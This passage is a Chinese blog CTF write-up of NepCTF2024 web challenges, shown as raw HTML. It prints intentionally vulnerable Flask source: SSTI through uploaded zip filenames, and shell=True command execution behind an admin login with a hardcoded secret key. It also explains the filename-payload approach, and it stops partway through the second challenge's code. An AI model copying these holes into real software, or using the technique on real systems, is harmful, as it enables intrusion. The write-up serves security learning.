@@ -1,0 +1,1233 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Zer0peach">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="NepCTF2024-web 复现NepDoublefrom flask import Flask, request,render_template,render_template_string from zipfile import ZipFile import os import datetime import hashlib from jinja2 import Environment, F">
+<meta property="og:type" content="article">
+<meta property="og:title" content="NepCTF2024-web">
+<meta property="og:url" content="https://zer0peach.github.io/2024/08/28/NepCTF2024-web/index.html">
+<meta property="og:site_name" content="Zer0peach can&#39;t think">
+<meta property="og:description" content="NepCTF2024-web 复现NepDoublefrom flask import Flask, request,render_template,render_template_string from zipfile import ZipFile import os import datetime import hashlib from jinja2 import Environment, F">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://zer0peach.github.io/images/NepCTF2024-web/image-20240828215240315.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/NepCTF2024-web/image-20240828212829913.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/NepCTF2024-web/image-20240828224756071.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/NepCTF2024-web/image-20240828215815742.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/NepCTF2024-web/image-20240829045419324.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/NepCTF2024-web/image-20240829042226059.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/NepCTF2024-web/image-20240829042356600.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/NepCTF2024-web/image-20240829043105487.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/NepCTF2024-web/image-20240829043320200.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/NepCTF2024-web/image-20240829043703283.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/NepCTF2024-web/image-20240829043728734.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/NepCTF2024-web/image-20240829003037137.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/NepCTF2024-web/image-20240829003558484.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/NepCTF2024-web/image-20240829002939335.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/NepCTF2024-web/image-20240829003704330.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/NepCTF2024-web/image-20240829012725881.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/NepCTF2024-web/image-20240829012817375.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/NepCTF2024-web/image-20240829182023791.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/NepCTF2024-web/image-20240829161214722.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/NepCTF2024-web/image-20240829012603545.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/NepCTF2024-web/image-20240829021327795.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/NepCTF2024-web/image-20240829034947801.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/NepCTF2024-web/image-20240829181005026.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/NepCTF2024-web/image-20240829181248389.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/NepCTF2024-web/image-20240829181721960.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/NepCTF2024-web/image-20240829180721758.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/NepCTF2024-web/image-20240829212409931.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/NepCTF2024-web/image-20240829210304571.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/NepCTF2024-web/image-20240829205503420.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/NepCTF2024-web/image-20240829205349557.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/NepCTF2024-web/image-20240829211651941.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/NepCTF2024-web/image-20240829212009581.png">
+<meta property="article:published_time" content="2024-08-28T13:19:04.000Z">
+<meta property="article:modified_time" content="2024-08-29T13:34:37.077Z">
+<meta property="article:author" content="Zer0peach">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://zer0peach.github.io/images/NepCTF2024-web/image-20240828215240315.png">
+  
+  
+  
+  <title>NepCTF2024-web - Zer0peach can&#39;t think</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"zer0peach.github.io","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":true,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Zer0peach&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="NepCTF2024-web"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-08-28 21:19" pubdate>
+          2024年8月28日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          17k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          141 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">NepCTF2024-web</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="NepCTF2024-web-复现"><a href="#NepCTF2024-web-复现" class="headerlink" title="NepCTF2024-web 复现"></a>NepCTF2024-web 复现</h1><h2 id="NepDouble"><a href="#NepDouble" class="headerlink" title="NepDouble"></a>NepDouble</h2><div class="code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request,render_template,render_template_string
+<span class="hljs-keyword">from</span> zipfile <span class="hljs-keyword">import</span> ZipFile
+<span class="hljs-keyword">import</span> os
+<span class="hljs-keyword">import</span> datetime
+<span class="hljs-keyword">import</span> hashlib
+<span class="hljs-keyword">from</span> jinja2 <span class="hljs-keyword">import</span> Environment, FileSystemLoader
+
+app = Flask(__name__,template_folder=<span class="hljs-string">&#x27;static&#x27;</span>)
+app.config[<span class="hljs-string">&#x27;MAX_CONTENT_LENGTH&#x27;</span>] = <span class="hljs-number">1</span> * <span class="hljs-number">1024</span> * <span class="hljs-number">1024</span>
+
+UPLOAD_FOLDER = <span class="hljs-string">&#x27;/app/uploads&#x27;</span>
+app.config[<span class="hljs-string">&#x27;UPLOAD_FOLDER&#x27;</span>] = UPLOAD_FOLDER
+
+<span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(UPLOAD_FOLDER):
+    os.makedirs(UPLOAD_FOLDER)
+
+template_env = Environment(loader=FileSystemLoader(<span class="hljs-string">&#x27;static&#x27;</span>), autoescape=<span class="hljs-literal">True</span>)
+
+
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">render_template</span>(<span class="hljs-params">template_name, **context</span>):
+    template = template_env.get_template(template_name)
+    <span class="hljs-keyword">return</span> template.render(**context)
+
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">render_template_string</span>(<span class="hljs-params">template_string, **context</span>):
+    template = template_env.from_string(template_string)
+    <span class="hljs-keyword">return</span> template.render(**context)
+
+
+<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span>
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():
+    <span class="hljs-keyword">if</span> request.method != <span class="hljs-string">&quot;POST&quot;</span>:
+        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Please use POST method to upload files.&#x27;</span>
+
+    <span class="hljs-keyword">try</span>:
+        clear_uploads_folder()
+        files = request.files.get(<span class="hljs-string">&#x27;tp_file&#x27;</span>, <span class="hljs-literal">None</span>)
+        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> files:
+            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;No file uploaded.&#x27;</span>
+
+        file_size = <span class="hljs-built_in">len</span>(files.read())
+        files.seek(<span class="hljs-number">0</span>)
+
+
+        file_extension = files.filename.rsplit(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-number">1</span>)[-<span class="hljs-number">1</span>].lower()
+        <span class="hljs-keyword">if</span> file_extension != <span class="hljs-string">&#x27;zip&#x27;</span>:
+            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Invalid file type. Please upload a .zip file.&#x27;</span>
+
+
+        timestamp = datetime.datetime.now().strftime(<span class="hljs-string">&#x27;%Y%m%d%H%M%S&#x27;</span>)
+        md5_dir_name = hashlib.md5(timestamp.encode()).hexdigest()
+        unzip_folder = os.path.join(app.config[<span class="hljs-string">&#x27;UPLOAD_FOLDER&#x27;</span>], md5_dir_name)
+        os.makedirs(unzip_folder, exist_ok=<span class="hljs-literal">True</span>)
+
+
+        <span class="hljs-keyword">with</span> ZipFile(files) <span class="hljs-keyword">as</span> zip_file:
+            zip_file.extractall(path=unzip_folder)
+
+        files_list = []
+        <span class="hljs-keyword">for</span> root, dirs, files <span class="hljs-keyword">in</span> os.walk(unzip_folder):
+            <span class="hljs-keyword">for</span> file <span class="hljs-keyword">in</span> files:
+                <span class="hljs-built_in">print</span>(file)
+                file_path = os.path.join(root, file)
+                relative_path = os.path.relpath(file_path, app.config[<span class="hljs-string">&#x27;UPLOAD_FOLDER&#x27;</span>])
+                link = <span class="hljs-string">f&#x27;&lt;a href=&quot;/cat?file=<span class="hljs-subst">&#123;relative_path&#125;</span>&quot;&gt;<span class="hljs-subst">&#123;file&#125;</span>&lt;/a&gt;&#x27;</span>
+                files_list.append(link)
+
+        <span class="hljs-keyword">return</span> render_template_string(<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>.join(files_list))
+
+    <span class="hljs-keyword">except</span> ValueError:
+        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Invalid filename.&#x27;</span>
+    
+    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
+        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;An error occurred. Please check your file and try again.&#x27;</span>
+
+
+<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/cat&#x27;</span></span>)</span>
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">cat</span>():
+    file_path = request.args.get(<span class="hljs-string">&#x27;file&#x27;</span>)
+    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> file_path:
+        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;File path is missing.&#x27;</span>
+
+    new_file = os.path.join(app.config[<span class="hljs-string">&#x27;UPLOAD_FOLDER&#x27;</span>], file_path)
+    <span class="hljs-comment"># /app/uploads</span>
+    <span class="hljs-keyword">if</span> os.path.commonprefix([os.path.abspath(new_file), os.path.abspath(app.config[<span class="hljs-string">&#x27;UPLOAD_FOLDER&#x27;</span>])]) != os.path.abspath(app.config[<span class="hljs-string">&#x27;UPLOAD_FOLDER&#x27;</span>]):
+        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Invalid file path.&#x27;</span>
+
+    <span class="hljs-keyword">if</span> os.path.islink(new_file):
+        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Symbolic links are not allowed.&#x27;</span>
+    
+    <span class="hljs-keyword">try</span>:
+        filename = file_path.split(<span class="hljs-string">&#x27;/&#x27;</span>)[-<span class="hljs-number">1</span>]
+        content = read_large_file(new_file)
+        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;test.html&#x27;</span>,content=content,filename=filename,dates=Exec_date())
+    <span class="hljs-keyword">except</span> FileNotFoundError:
+        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;File not found.&#x27;</span>
+    <span class="hljs-keyword">except</span> IOError <span class="hljs-keyword">as</span> e:
+        <span class="hljs-keyword">return</span> <span class="hljs-string">f&#x27;Error reading file: <span class="hljs-subst">&#123;<span class="hljs-built_in">str</span>(e)&#125;</span>&#x27;</span>
+
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">Exec_date</span>():
+    d_res = os.popen(<span class="hljs-string">&#x27;date&#x27;</span>).read()
+    <span class="hljs-keyword">return</span> d_res.split(<span class="hljs-string">&quot; &quot;</span>)[-<span class="hljs-number">1</span>].strip()+<span class="hljs-string">&quot; &quot;</span>+d_res.split(<span class="hljs-string">&quot; &quot;</span>)[-<span class="hljs-number">3</span>]
+
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">clear_uploads_folder</span>():
+    <span class="hljs-keyword">for</span> root, dirs, files <span class="hljs-keyword">in</span> os.walk(app.config[<span class="hljs-string">&#x27;UPLOAD_FOLDER&#x27;</span>], topdown=<span class="hljs-literal">False</span>):
+        <span class="hljs-keyword">for</span> file <span class="hljs-keyword">in</span> files:
+            os.remove(os.path.join(root, file))
+        <span class="hljs-keyword">for</span> <span class="hljs-built_in">dir</span> <span class="hljs-keyword">in</span> dirs:
+            os.rmdir(os.path.join(root, <span class="hljs-built_in">dir</span>))
+
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">read_large_file</span>(<span class="hljs-params">file_path</span>):
+    content = <span class="hljs-string">&#x27;&#x27;</span>
+    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(file_path, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> file:
+        <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> file:
+            content += line
+    <span class="hljs-keyword">return</span> content
+
+<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:
+    app.run(<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>,port=<span class="hljs-string">&quot;8000&quot;</span>,debug=<span class="hljs-literal">False</span>)
+</code></pre></div>
+
+<p>逻辑简单，就两个功能</p>
+<p>只允许上传zip文件，会自动解压，然后读取解压后的文件</p>
+<h3 id="我的错误思路（无需关注）"><a href="#我的错误思路（无需关注）" class="headerlink" title="我的错误思路（无需关注）"></a>我的错误思路（无需关注）</h3><p>我一直在关注cat路由的读取文件功能，想着控制file参数（即<code>relative_path</code>）</p>
+<div class="code-wrapper"><pre><code class="hljs">    for root, dirs, files in os.walk(unzip_folder):
+        for file in files:
+            print(file)
+            file_path = os.path.join(root, file)
+            relative_path = os.path.relpath(file_path, app.config[&#39;UPLOAD_FOLDER&#39;])
+            link = f&#39;&lt;a href=&quot;/cat?file=&#123;relative_path&#125;&quot;&gt;&#123;file&#125;&lt;/a&gt;&#39;
+            files_list.append(link)
+
+    return render_template_string(&#39;&lt;br&gt;&#39;.join(files_list))
+</code></pre></div>
+<p>而<code>UPLOAD_FOLDER</code>是<code>/app/uploads</code>，所以想要让<code>relative_path</code>为<code>../../flag</code>（当然并不确定flag的名称），<code>file_path</code>的值要为<code>/flag</code>，也就是<code>file</code>(即文件名)要为<code>/flag</code></p>
+<p>但尴尬的事情出现了，文件名中不能有<code>/</code></p>
+<p>于是思路报废</p>
+<h3 id="正确思路"><a href="#正确思路" class="headerlink" title="正确思路"></a>正确思路</h3><div class="code-wrapper"><pre><code class="hljs stylus"><span class="hljs-keyword">for</span> root, dirs, files <span class="hljs-keyword">in</span> os<span class="hljs-selector-class">.walk</span>(unzip_folder):
+    <span class="hljs-keyword">for</span> file <span class="hljs-keyword">in</span> files:
+        <span class="hljs-built_in">print</span>(file)
+        file_path = os<span class="hljs-selector-class">.path</span><span class="hljs-selector-class">.join</span>(root, file)
+        relative_path = os<span class="hljs-selector-class">.path</span><span class="hljs-selector-class">.relpath</span>(file_path, app<span class="hljs-selector-class">.config</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;UPLOAD_FOLDER&#x27;</span>]</span>)
+        link = f<span class="hljs-string">&#x27;&lt;a href=&quot;/cat?file=&#123;relative_path&#125;&quot;&gt;&#123;file&#125;&lt;/a&gt;&#x27;</span>
+        files_list<span class="hljs-selector-class">.append</span>(link)
+
+return <span class="hljs-built_in">render_template_string</span>(<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span><span class="hljs-selector-class">.join</span>(files_list))</code></pre></div>
+
+<p>还是这一段，render_template_string存在ssti漏洞</p>
+<p>file即文件名能够控制</p>
+<p>（其实这思路当时也想到了，但是不知道为什么没去尝试，太懒了，感觉现在的我很多时候不是没思路，只是不愿尝试，很烦）</p>
+<p>于是文件名上写payload，然后压缩上传即可</p>
+<p><img src="/../images/NepCTF2024-web/image-20240828215240315.png" srcset="/img/loading.gif" lazyload alt="image-20240828215240315"></p>
+<p><img src="/../images/NepCTF2024-web/image-20240828212829913.png" srcset="/img/loading.gif" lazyload alt="image-20240828212829913"></p>
+<h2 id="boom-it"><a href="#boom-it" class="headerlink" title="boom_it"></a>boom_it</h2><div class="code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, render_template, request, session, redirect, url_for
+<span class="hljs-keyword">import</span> threading
+<span class="hljs-keyword">import</span> random
+<span class="hljs-keyword">import</span> string
+<span class="hljs-keyword">import</span> datetime
+<span class="hljs-keyword">import</span> rsa
+<span class="hljs-keyword">from</span> werkzeug.utils <span class="hljs-keyword">import</span> secure_filename
+<span class="hljs-keyword">import</span> os
+<span class="hljs-keyword">import</span> subprocess
+
+(pubkey, privkey) = rsa.newkeys(<span class="hljs-number">2048</span>)
+
+app = Flask(__name__)
+app.secret_key = <span class="hljs-string">&quot;super_secret_key&quot;</span>
+
+
+
+UPLOAD_FOLDER = <span class="hljs-string">&#x27;templates/uploads&#x27;</span>
+ALLOWED_EXTENSIONS = &#123;<span class="hljs-string">&#x27;png&#x27;</span>, <span class="hljs-string">&#x27;jpg&#x27;</span>, <span class="hljs-string">&#x27;txt&#x27;</span>&#125;
+
+app.config[<span class="hljs-string">&#x27;UPLOAD_FOLDER&#x27;</span>] = UPLOAD_FOLDER
+
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">allowed_file</span>(<span class="hljs-params">filename</span>):
+    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;.&#x27;</span> <span class="hljs-keyword">in</span> filename <span class="hljs-keyword">and</span> filename.rsplit(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-number">1</span>)[<span class="hljs-number">1</span>].lower() <span class="hljs-keyword">in</span> ALLOWED_EXTENSIONS
+
+<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/admin&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span>
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">admin</span>():
+    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:
+        username = request.form.get(<span class="hljs-string">&#x27;username&#x27;</span>)
+        password = request.form.get(<span class="hljs-string">&#x27;password&#x27;</span>)
+        <span class="hljs-keyword">if</span> username == <span class="hljs-string">&#x27;admin&#x27;</span> <span class="hljs-keyword">and</span> password == users.get(<span class="hljs-string">&#x27;admin&#x27;</span>, &#123;&#125;).get(<span class="hljs-string">&#x27;password&#x27;</span>):
+            session[<span class="hljs-string">&#x27;admin_logged_in&#x27;</span>] = <span class="hljs-literal">True</span>
+            <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;admin_dashboard&#x27;</span>))
+        <span class="hljs-keyword">else</span>:
+            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Invalid credentials&quot;</span>, <span class="hljs-number">401</span>
+    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;admin_login.html&#x27;</span>)
+
+<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/admin/dashboard&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span>
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">admin_dashboard</span>():
+    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> session.get(<span class="hljs-string">&#x27;admin_logged_in&#x27;</span>):
+        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;admin&#x27;</span>))
+
+    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:
+        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;file&#x27;</span> <span class="hljs-keyword">in</span> request.files:
+            file = request.files[<span class="hljs-string">&#x27;file&#x27;</span>]
+        <span class="hljs-keyword">if</span> file.filename == <span class="hljs-string">&#x27;&#x27;</span>:
+            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;No selected file&#x27;</span>
+        filename = file.filename
+        file.save(os.path.join(app.config[<span class="hljs-string">&#x27;UPLOAD_FOLDER&#x27;</span>], filename))
+        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;File uploaded successfully&#x27;</span>
+
+    cmd_output = <span class="hljs-string">&quot;&quot;</span>
+    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;cmd&#x27;</span> <span class="hljs-keyword">in</span> request.args:
+        <span class="hljs-keyword">if</span> os.path.exists(<span class="hljs-string">&quot;lock.txt&quot;</span>):  <span class="hljs-comment"># 检查当前目录下是否存在lock.txt</span>
+            cmd = request.args.get(<span class="hljs-string">&#x27;cmd&#x27;</span>)
+            <span class="hljs-keyword">try</span>:
+                cmd_output = subprocess.check_output(cmd, shell=<span class="hljs-literal">True</span>).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)
+            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
+                cmd_output = <span class="hljs-built_in">str</span>(e)
+        <span class="hljs-keyword">else</span>:
+            cmd_output = <span class="hljs-string">&quot;lock.txt not found. Command execution not allowed.&quot;</span>
+    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;admin_dashboard.html&#x27;</span>, users=users, cmd_output=cmd_output, active_tab=<span class="hljs-string">&quot;cmdExecute&quot;</span>)
+
+
+<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/admin/logout&#x27;</span></span>)</span>
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">admin_logout</span>():
+    session.pop(<span class="hljs-string">&#x27;admin_logged_in&#x27;</span>, <span class="hljs-literal">None</span>)
+    <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;index&#x27;</span>))
+
+<span class="hljs-comment"># Generate random users</span>
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_random_users</span>(<span class="hljs-params">n</span>):
+    users = &#123;&#125;
+    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n):
+        username = <span class="hljs-string">&#x27;&#x27;</span>.join(random.choices(string.ascii_letters + string.digits, k=<span class="hljs-number">15</span>))
+        password = <span class="hljs-string">&#x27;&#x27;</span>.join(random.choices(string.ascii_letters + string.digits, k=<span class="hljs-number">15</span>))
+        users[username] = &#123;<span class="hljs-string">&quot;password&quot;</span>: password, <span class="hljs-string">&quot;balance&quot;</span>: <span class="hljs-number">2000</span>&#125;
+    <span class="hljs-keyword">return</span> users
+
+users = generate_random_users(<span class="hljs-number">1000</span>)
+users[<span class="hljs-string">&quot;HRP&quot;</span>] = &#123;<span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-string">&quot;HRP&quot;</span>, <span class="hljs-string">&quot;balance&quot;</span>: <span class="hljs-number">6000</span>&#125;
+
+<span class="hljs-comment"># Add an admin user with a random password</span>
+admin_password = <span class="hljs-string">&#x27;&#x27;</span>.join(random.choices(string.ascii_letters + string.digits, k=<span class="hljs-number">15</span>))
+users[<span class="hljs-string">&quot;admin&quot;</span>] = &#123;<span class="hljs-string">&quot;password&quot;</span>: admin_password, <span class="hljs-string">&quot;balance&quot;</span>: <span class="hljs-number">0</span>&#125;
+
+flag_price = <span class="hljs-number">10000</span>
+flag = admin_password  <span class="hljs-comment"># The flag is the password of the admin user</span>
+mutex = threading.Lock()
+
+
